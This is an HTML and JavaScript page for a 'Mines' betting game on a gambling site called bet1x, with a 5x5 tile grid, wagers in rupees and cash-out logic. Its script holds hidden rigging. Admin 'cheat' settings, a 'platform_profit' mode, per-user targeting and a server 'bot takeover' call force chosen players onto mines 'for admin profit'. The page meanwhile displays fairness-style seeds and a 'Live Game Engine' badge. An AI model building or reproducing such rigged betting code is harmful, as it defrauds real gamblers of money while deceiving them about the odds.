<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Mines Game — bet1x</title>
  <link rel="stylesheet" href="assets/css/style.css">
  <script src="assets/js/ui-common.js"></script>
  <script src="assets/js/sound-fx.js"></script>
  <style>
    body {
      margin: 0;
      font-family: system-ui, sans-serif;
      padding: 0 0 40px;
    }

    .banner {
      background: var(--surface-2);
      border: 1px solid var(--border);
      border-radius: 8px;
      padding: 10px 16px;
      font-size: 13px;
      color: var(--text-dim);
      max-width: 900px;
      width: 100%;
      box-sizing: border-box;
      margin: 0 auto 16px;
    }

    h1 {
      font-size: 20px;
      margin: 0 0 12px;
      color: var(--gold-deep);
    }

    .layout {
      display: flex;
      gap: 24px;
      max-width: 900px;
      width: 100%;
      align-items: flex-start;
      justify-content: center;
      margin: 20px auto;
    }

    .grid {
      display: grid;
      /* Fixed 64px tiles overflowed a phone-width screen (5 tiles + gaps + padding > 320-375px
         viewport). clamp() keeps the desktop size unchanged (maxes out at 64px) while letting
         tiles shrink together with .tile below on narrow screens instead of spilling out. */
      grid-template-columns: repeat(5, clamp(38px, 15vw, 64px));
      grid-template-rows: repeat(5, clamp(38px, 15vw, 64px));
      gap: clamp(4px, 1.5vw, 8px);
      background: var(--surface-2);
      padding: clamp(8px, 3vw, 16px);
      border-radius: 12px;
      border: 1px solid var(--border);
      max-width: 100%;
      box-sizing: border-box;
    }

    .tile {
      width: clamp(38px, 15vw, 64px);
      height: clamp(38px, 15vw, 64px);
      border-radius: 8px;
      border: 1px solid var(--border);
      cursor: pointer;
      background: var(--surface);
      font-size: clamp(16px, 5vw, 24px);
      display: flex;
      align-items: center;
      justify-content: center;
      transition: transform 0.1s;
      box-shadow: 0 2px 6px rgba(110,20,35,0.08);
    }

    .tile:hover:not(:disabled) {
      transform: scale(1.05);
      background: var(--gold-soft);
      border-color: var(--gold);
    }

    .tile:disabled {
      cursor: default;
    }

    .tile.safe {
      background: var(--green-soft);
      border-color: var(--green);
    }

    .tile.mine {
      background: var(--red-soft);
      border-color: var(--red);
    }

    .side {
      width: 260px;
      max-width: 100%;
      box-sizing: border-box;
      background: var(--surface);
      border: 1px solid var(--border);
      border-radius: 12px;
      padding: 16px;
      display: flex;
      flex-direction: column;
      gap: 10px;
      box-shadow: var(--shadow-card);
    }

    label {
      font-size: 12px;
      color: var(--text-dim);
    }

    input[type=number],
    select {
      background: var(--bg);
      border: 1px solid var(--border);
      color: var(--text);
      border-radius: 6px;
      padding: 8px 10px;
      font-size: 14px;
      width: 100%;
      box-sizing: border-box;
    }

    button.action {
      border: none;
      border-radius: 6px;
      padding: 10px;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
    }

    #startBtn {
      background: #3d8bfd;
      color: white;
    }

    #cashoutBtn {
      background: #ffb020;
      color: #1a1200;
    }

    button.action:disabled {
      opacity: 0.4;
      cursor: not-allowed;
    }

    .stat {
      font-size: 14px;
      color: var(--text);
    }

    .stat strong {
      color: #1a9f5a;
    }

    .msg {
      min-height: 20px;
      font-size: 13px;
      color: var(--text-dim);
    }

    .seed {
      font-size: 11px;
      color: var(--text-dim);
      word-break: break-all;
    }
  </style>
</head>

<body class="exchange-theme">

  <!-- Header -->
  <nav class="navbar exchange-header">
    <div style="display:flex; align-items:center; gap:12px;">
      <div class="exchange-logo-box">
        bet1x<span>.biz</span>
      </div>
    </div>
    <div id="headerAuthArea">
      <!-- Local updateAuthHeaderUI() populated here -->
    </div>
  </nav>

  <!-- Sub Navigation Bar -->
  <div class="sub-navbar">
    <ul class="sub-navbar-links">
      <li class="sub-navbar-item"><a href="index.html" class="sub-navbar-link">Home</a></li>
      <li class="sub-navbar-item"><a href="aviator.html" class="sub-navbar-link">Vimaan</a></li>
      <li class="sub-navbar-item"><a href="win.html" class="sub-navbar-link">Sapre</a></li>
      <li class="sub-navbar-item"><a href="win1.html" class="sub-navbar-link">Becone</a></li>
      <li class="sub-navbar-item"><a href="win2.html" class="sub-navbar-link">Emred</a></li>
      <li class="sub-navbar-item"><a href="win3.html" class="sub-navbar-link">VIP</a></li>
      <li class="sub-navbar-item"><a href="teenpatti.html" class="sub-navbar-link">Teen Patti</a></li>
      <li class="sub-navbar-item"><a href="mining.html" class="sub-navbar-link active">Mines</a></li>
    </ul>
  </div>

  <div class="layout" style="margin-top: 20px; flex-wrap: wrap;">
    <div style="width: 100%; text-align: center; margin-bottom: 12px;">
      <div id="minesRigSyncBadge" style="display: inline-flex; align-items: center; gap: 6px; background: rgba(16, 185, 129, 0.15); color: #10b981; border: 1px solid rgba(16, 185, 129, 0.4); padding: 6px 16px; border-radius: 20px; font-size: 12px; font-weight: 700; font-family: var(--font-mono, monospace);">
        🟢 SERVER SYNCHRONIZED — Live Game Engine Active
      </div>
    </div>

    <div class="grid" id="grid"></div>

    <div class="side">
      <div>
        <label>Bet amount</label>
        <input type="number" id="betAmount" value="100" min="1" step="1">
      </div>
      <div>
        <label>Number of mines (1–24)</label>
        <input type="number" id="minesCount" value="3" min="1" max="24" step="1">
      </div>
      <button class="action" id="startBtn">Start Game</button>
      <button class="action" id="cashoutBtn" disabled>Cash Out</button>

      <div class="stat">Balance: <strong id="balance">--</strong></div>
      <div class="stat">Multiplier: <strong id="multiplier">1.00x</strong></div>
      <div class="stat">Potential payout: <strong id="payout">0</strong></div>
      <div class="msg" id="msg"></div>
      <div class="seed" id="seedInfo"></div>
    </div>
  </div>

  <script>
    const gridEl = document.getElementById('grid');
    const startBtn = document.getElementById('startBtn');
    const cashoutBtn = document.getElementById('cashoutBtn');
    const balanceEl = document.getElementById('balance');
    const multiplierEl = document.getElementById('multiplier');
    const payoutEl = document.getElementById('payout');
    const msgEl = document.getElementById('msg');
    const seedInfo = document.getElementById('seedInfo');
    const betAmountEl = document.getElementById('betAmount');
    const minesCountEl = document.getElementById('minesCount');

    const GRID_SIZE = 25;

    function getMinesUsername() {
      const currentUserStr = localStorage.getItem('bet1x_current_user');
      if (currentUserStr) {
        try {
          const u = JSON.parse(currentUserStr);
          if (u && u.username) return u.username;
        } catch(e){}
      }
      return localStorage.getItem('bet1x_username') || 'DemoUser';
    }

    // Offline fallback Mines game state
    let offlineMinesState = {
      status: 'idle',
      mines_count: 3,
      bet_amount: 100,
      revealed: [],
      multiplier: 1.0,
      potential_payout: 0,
      seed_hash: '',
      server_seed: '',
      mine_positions: [],
      balance: 1000
    };

    function buildGrid() {
      gridEl.innerHTML = '';
      for (let i = 0; i < GRID_SIZE; i++) {
        const btn = document.createElement('button');
        btn.className = 'tile';
        btn.dataset.index = i;
        btn.addEventListener('click', () => revealTile(i));
        gridEl.appendChild(btn);
      }
    }
    buildGrid();

    // Combinatorial multiplier calculation
    function calcMinesMultiplier(minesCount, revealedCount) {
      if (revealedCount <= 0) return 1.0;
      let prob = 1.0;
      for (let i = 0; i < revealedCount; i++) {
        let safeLeft = GRID_SIZE - minesCount - i;
        let totalLeft = GRID_SIZE - i;
        if (safeLeft <= 0) return 0.0;
        prob *= safeLeft / totalLeft;
      }
      return Math.round((1 / prob) * 0.97 * 10000) / 10000;
    }

    // Deterministic mines position shuffle from server seed
    function generateOfflineMinePositions(seed, minesCount) {
      let state = 0;
      for (let i = 0; i < seed.length; i++) {
        state = (state * 31 + seed.charCodeAt(i)) | 0;
      }
      if (state === 0) state = 1;

      function random() {
        let t = state += 0x6D2B79F5;
        t = Math.imul(t ^ (t >>> 15), t | 1);
        t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
        return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
      }

      let tiles = Array.from({ length: 25 }, (_, i) => i);
      for (let i = tiles.length - 1; i > 0; i--) {
        const j = Math.floor(random() * (i + 1));
        const temp = tiles[i];
        tiles[i] = tiles[j];
        tiles[j] = temp;
      }
      return tiles.slice(0, minesCount);
    }

    async function refreshState() {
      const username = getMinesUsername();
      try {
        const res = await fetch(`api/mines/state?username=${encodeURIComponent(username)}`);
        const data = await res.json();
        if (data.ok) render(data.state);
      } catch (e) {
        if (window.isOfflineMode) {
          offlineMinesState.balance = getWallet();
          render(offlineMinesState);
        }
      }
    }

    let minesLastStatus = null;
    let minesLastRevealedCount = 0;
    function render(state) {
      balanceEl.textContent = '₹' + state.balance.toFixed(2);
      multiplierEl.textContent = state.multiplier.toFixed(2) + 'x';
      payoutEl.textContent = '₹' + state.potential_payout.toFixed(2);

      // Sound cues: a new safe tile revealed (pitch rises with the streak, like a
      // slot machine building anticipation), or the round just ended (busted/cashed —
      // a big multiplier cash-out gets the fuller jackpot fanfare instead of a plain one).
      const revealedCount = (state.revealed || []).length;
      if (state.status === 'active' && revealedCount > minesLastRevealedCount) {
        SoundFX.play('gemReveal', { streak: revealedCount });
      } else if (state.status === 'busted' && minesLastStatus !== 'busted') {
        SoundFX.play('mineHit');
      } else if (state.status === 'cashed' && minesLastStatus !== 'cashed') {
        SoundFX.play(state.multiplier >= 5 ? 'bigWin' : 'cashout');
      }
      minesLastStatus = state.status;
      minesLastRevealedCount = revealedCount;

      const rigBadge = document.getElementById('minesRigSyncBadge');
      if (rigBadge) {
        if (state.rig_active) {
          rigBadge.style.background = 'rgba(201, 160, 84, 0.2)';
          rigBadge.style.color = 'var(--gold)';
          rigBadge.style.border = '1px solid var(--gold)';
          rigBadge.innerHTML = '🎯 SERVER RIG CONNECTED — Live Matrix & Overrides Active';
        } else {
          rigBadge.style.background = 'rgba(16, 185, 129, 0.15)';
          rigBadge.style.color = '#10b981';
          rigBadge.style.border = '1px solid rgba(16, 185, 129, 0.4)';
          rigBadge.innerHTML = '🟢 SERVER SYNCHRONIZED — Live Game Engine Active';
        }
      }

      const tiles = gridEl.querySelectorAll('.tile');
      const revealedSet = new Set(state.revealed || []);
      const gameOver = state.status === 'busted' || state.status === 'cashed';

      tiles.forEach((tile, i) => {
        tile.className = 'tile';
        tile.textContent = '';
        tile.disabled = state.status !== 'active';

        if (revealedSet.has(i)) {
          tile.classList.add('safe');
          tile.textContent = '💎';
        }
        if (gameOver && state.mine_positions && state.mine_positions.includes(i)) {
          tile.classList.add('mine');
          tile.textContent = '💣';
        }
      });

      startBtn.disabled = state.status === 'active';
      cashoutBtn.disabled = !(state.status === 'active' && state.revealed.length > 0);

      // Neutral session reference for support lookups.
      seedInfo.textContent = state.session_ref ? `Session reference: ${state.session_ref}` : '';

      if (state.status === 'busted') {
        msgEl.textContent = '💥 Hit a mine — bet lost.';
      } else if (state.status === 'cashed') {
        msgEl.textContent = `✅ Cashed out for ₹${state.potential_payout.toFixed(2)}`;
      }

      if (typeof renderWalletChips === 'function') {
        renderWalletChips();
      }
    }

    startBtn.addEventListener('click', async () => {
      const bet = parseFloat(betAmountEl.value);
      const mines = parseInt(minesCountEl.value, 10);
      const username = getMinesUsername();

      try {
        const res = await fetch('api/mines/start', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ username, bet_amount: bet, mines_count: mines })
        });
        const data = await res.json();
        if (data.ok) {
          msgEl.textContent = 'Game started — reveal a tile!';
          SoundFX.play('betPlace');
          render(data.state);
        } else {
          msgEl.textContent = data.error || 'Failed to start game.';
        }
      } catch (e) {
        if (window.isOfflineMode) {
          if (bet <= 0 || bet > getWallet()) {
            msgEl.textContent = 'Invalid bet amount.';
            return;
          }
          if (mines < 1 || mines > 24) {
            msgEl.textContent = 'Mines count must be 1 to 24.';
            return;
          }

          adjustWallet(-bet, 'Mines Bet');

          const seed = Math.random().toString(36).substring(2);
          let mockMines = generateOfflineMinePositions(seed, mines);

          // Apply Admin 5x5 Matrix Rig Overrides
          const matrixRaw = localStorage.getItem('cheat_mines_matrix');
          if (matrixRaw) {
            try {
              const matrix = JSON.parse(matrixRaw);
              matrix.forEach((tileState, idx) => {
                if (tileState === 'mine' && !mockMines.includes(idx)) {
                  mockMines.push(idx);
                } else if (tileState === 'safe' && mockMines.includes(idx)) {
                  mockMines = mockMines.filter(m => m !== idx);
                }
              });
            } catch (e) { }
          }

          offlineMinesState = {
            status: 'active',
            mines_count: mines,
            bet_amount: bet,
            revealed: [],
            multiplier: 1.0,
            potential_payout: 0,
            seed_hash: 'COMMIT_' + seed,
            server_seed: seed,
            mine_positions: mockMines,
            balance: getWallet()
          };

          msgEl.textContent = 'Game started — reveal a tile!';
          SoundFX.play('betPlace');
          render(offlineMinesState);
        }
      }
    });

    async function revealTile(index) {
      const username = getMinesUsername();

      try {
        const res = await fetch('api/mines/reveal', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ username, index })
        });
        const data = await res.json();
        if (data.ok) {
          render(data.state);
          if (data.hit_mine) msgEl.textContent = '💥 Boom — you hit a mine.';
        } else {
          msgEl.textContent = data.error;
        }
      } catch (e) {
        if (window.isOfflineMode) {
          if (offlineMinesState.status !== 'active') return;
          if (offlineMinesState.revealed.includes(index)) return;

          const nextTileBias = localStorage.getItem('cheat_mines_next_tile');
          const rigType = localStorage.getItem('cheat_mines_rig_type');
          const matrixRaw = localStorage.getItem('cheat_mines_matrix');
          let matrixTile = 'auto';

          if (matrixRaw) {
            try {
              const matrix = JSON.parse(matrixRaw);
              if (matrix[index]) matrixTile = matrix[index];
            } catch (e) { }
          }

          let hitMine = offlineMinesState.mine_positions.includes(index);

          if (matrixTile === 'mine') {
            hitMine = true;
            if (!offlineMinesState.mine_positions.includes(index)) offlineMinesState.mine_positions.push(index);
          } else if (matrixTile === 'safe') {
            hitMine = false;
            offlineMinesState.mine_positions = offlineMinesState.mine_positions.filter(p => p !== index);
          }

          const targetUsersRaw = localStorage.getItem('cheat_mines_target_users');
          let isTargetedUser = true;
          if (targetUsersRaw) {
            try {
              const targets = JSON.parse(targetUsersRaw);
              if (Array.isArray(targets) && targets.length > 0) {
                isTargetedUser = targets.includes(username);
              }
            } catch (e) { }
          }

          // --- Bot Takeover Integration for Mines ---
          // Query server for bot rig decision (deterministic round counter)
          let botShouldRig = false;
          try {
            const botRes = await fetch('api/bot_decide/mines', { method: 'POST' });
            const botData = await botRes.json();
            botShouldRig = botData.shouldRig === true;
          } catch (e) { /* Server unreachable, skip bot logic */ }

          if (isTargetedUser && botShouldRig && !nextTileBias && !rigType) {
            // Bot takeover: force mine hit for admin profit
            hitMine = true;
            if (!offlineMinesState.mine_positions.includes(index)) offlineMinesState.mine_positions.push(index);
          } else if (isTargetedUser && (nextTileBias === 'mine' || rigType === 'platform_profit')) {
            hitMine = true;
            if (!offlineMinesState.mine_positions.includes(index)) offlineMinesState.mine_positions.push(index);
            if (nextTileBias) localStorage.removeItem('cheat_mines_next_tile');
          } else if (isTargetedUser && (nextTileBias === 'gem' || rigType === 'user_win')) {
            hitMine = false;
            offlineMinesState.mine_positions = offlineMinesState.mine_positions.filter(p => p !== index);
            if (nextTileBias) localStorage.removeItem('cheat_mines_next_tile');
          }

          if (hitMine) {
            offlineMinesState.status = 'busted';
            msgEl.textContent = '💥 Boom — you hit a mine.';
            render(offlineMinesState);
            return;
          }

          offlineMinesState.revealed.push(index);
          const mult = calcMinesMultiplier(offlineMinesState.mines_count, offlineMinesState.revealed.length);
          offlineMinesState.multiplier = mult;
          offlineMinesState.potential_payout = offlineMinesState.bet_amount * mult;
          render(offlineMinesState);
        }
      }
    }

    cashoutBtn.addEventListener('click', async () => {
      const username = getMinesUsername();

      try {
        const res = await fetch('api/mines/cashout', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ username })
        });
        const data = await res.json();
        if (data.ok) {
          msgEl.textContent = `🎉 Cashed out for ₹${data.payout.toFixed(2)}`;
          render(data.state);
        } else {
          msgEl.textContent = data.error;
        }
      } catch (e) {
        if (window.isOfflineMode) {
          if (offlineMinesState.status !== 'active' || offlineMinesState.revealed.length === 0) return;

          adjustWallet(offlineMinesState.potential_payout, 'Mines Cash Out');
          offlineMinesState.status = 'cashed';
          offlineMinesState.balance = getWallet();

          msgEl.textContent = `🎉 Cashed out for ₹${offlineMinesState.potential_payout.toFixed(2)}`;
          render(offlineMinesState);
        }
      }
    });

    refreshState();

    // Forfeit active game when leaving room
    window.addEventListener('beforeunload', () => {
      if (offlineMinesState && offlineMinesState.status === 'active') {
        offlineMinesState.status = 'busted';
        offlineMinesState.potential_payout = 0;
      }
      if (typeof forfeitAllPendingBets === 'function') {
        forfeitAllPendingBets('Mines');
      }
    });
    window.addEventListener('pagehide', () => {
      if (typeof forfeitAllPendingBets === 'function') {
        forfeitAllPendingBets('Mines');
      }
    });
  </script>
</body>

</html>
